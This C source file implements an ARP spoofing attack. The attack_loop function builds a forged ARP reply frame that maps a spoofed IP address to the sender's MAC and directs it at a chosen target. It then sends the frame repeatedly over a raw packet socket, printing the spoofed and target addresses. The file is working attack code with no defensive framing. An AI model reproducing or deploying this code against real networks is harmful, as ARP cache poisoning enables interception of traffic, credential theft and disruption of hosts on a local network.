
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>   
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>


#include "attack.h"

void attack_loop(ATTACK_INFO info, char * inface_name){
	
	unsigned char EthernetFrame[64] ={0};	// ethernet frame
    // set ARP header
	ARP_HEADER ARP_Spoofing ;
	ARP_Spoofing.Hardware = htons (1);
	ARP_Spoofing.Protocol = htons (2048);
	ARP_Spoofing.HardwareAddressLen = 6;
	ARP_Spoofing.ProtocolAddressLeng =4 ;
	ARP_Spoofing.Operation = htons(2);

	memcpy(ARP_Spoofing.SoruceHardareAddr  ,info.spoofing_MAC	,sizeof(char)*6);
	memcpy(ARP_Spoofing.SourceProtocolAddr ,info.spoofing_IP	,sizeof(char)*4);
	memcpy(ARP_Spoofing.TargetHardareAddr  ,info.target_MAC,sizeof(char)*6);
	memcpy(ARP_Spoofing.TargetProtocolAddr ,info.target_IP ,sizeof(char)*4);

	memcpy(EthernetFrame ,info.target_MAC ,sizeof(char)*6);
	memcpy(EthernetFrame+6 ,info.spoofing_MAC ,sizeof(char)*6);  //my ip

	//EthernetFrame[12] = 0x08;
	//EthernetFrame[13] = 0x06;
	EthernetFrame[12] = ETH_P_ARP / 256;
	EthernetFrame[13] = ETH_P_ARP % 256;

	// copy ARP header to ethernet packet
	memcpy (EthernetFrame + 14, &ARP_Spoofing, sizeof (char)*28);
	/*------------------------------------------*/
	 int ARPSocket ;

        // create socket
        printf("Create RAW Socket ... ");
        if( (ARPSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) )) <0)
	{
            printf("Faile\n");
            exit(-1);
	}
        printf("Successfully\n");

	// Get Interface ibdex
	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex ((const char*)inface_name)) == 0)
	{
 	    printf("if_nametoindex() failed to obtain interface index ");
    	    exit (EXIT_FAILURE);
  	}
	printf ("Index for interface %s is %i\n", "eth0", device.sll_ifindex);
	device.sll_family = AF_PACKET;
  	device.sll_halen = htons (6);


	while(sendto (ARPSocket, EthernetFrame, 42, 0, (struct sockaddr *) &device, sizeof (device)) != 0){
		printf("Spoofing_IP : %d.%d.%d.%d ",info.spoofing_IP[0],info.spoofing_IP[1],info.spoofing_IP[2],info.spoofing_IP[3]);
		printf("Spoofing_MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",info.spoofing_MAC[0],info.spoofing_MAC[1],info.spoofing_MAC[2],info.spoofing_MAC[3],info.spoofing_MAC[4],info.spoofing_MAC[5]);

		printf("target_IP : %d.%d.%d.%d ",info.target_IP[0],info.target_IP[1],info.target_IP[2],info.target_IP[3]);
		printf("target_MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",info.target_MAC[0],info.target_MAC[1],info.target_MAC[2],info.target_MAC[3],info.target_MAC[4],info.target_MAC[5]);
	}


	// close socket
	close(ARPSocket);

	// free data
	printf("finish\n");
}
